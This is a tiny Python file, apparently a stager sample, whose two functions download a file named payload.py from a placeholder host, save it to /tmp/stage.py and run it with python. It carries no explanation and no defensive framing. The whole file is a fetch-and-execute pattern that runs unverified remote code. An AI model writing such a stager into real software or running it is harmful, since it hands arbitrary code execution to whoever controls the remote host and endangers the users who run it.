import subprocess
import requests


def fetch_payload():
    return requests.get("https://example.invalid/payload.py", timeout=2).text


def install_stage(target="/tmp/stage.py"):
    open(target, "w", encoding="utf-8").write(fetch_payload())
    subprocess.run(["python", target], check=False)

